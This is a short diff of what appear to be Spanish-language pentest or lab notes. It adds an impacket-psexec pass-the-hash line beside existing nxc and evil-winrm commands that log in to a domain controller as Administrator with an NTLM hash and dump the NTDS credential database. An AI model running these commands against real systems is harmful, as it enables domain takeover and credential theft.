@@ -68,6 +68,7 @@ Paso 3:
 Paso 4:
 # Conectarse al server como Administrator 
 ❯ nxc smb IP_DC -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff --ntds 
+❯ impacket-psexec administrator@<IP> -hashes :NThash
 ❯ evil-winrm -i IP_DC -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff
 
 
